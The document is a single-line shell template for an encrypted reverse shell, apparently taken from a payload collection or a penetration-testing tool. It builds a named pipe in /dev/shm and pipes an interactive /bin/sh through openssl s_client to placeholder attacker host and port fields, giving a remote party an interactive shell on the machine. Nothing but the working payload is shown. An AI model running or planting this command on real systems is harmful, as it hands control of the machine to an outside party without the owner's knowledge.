rm -f /dev/shm/s;mkfifo /dev/shm/s && /bin/sh -i </dev/shm/s 2>&1 | openssl s_client -quiet -connect {{ LHOST }}:{{ LPORT }} >/dev/shm/s;rm -f /dev/shm/s
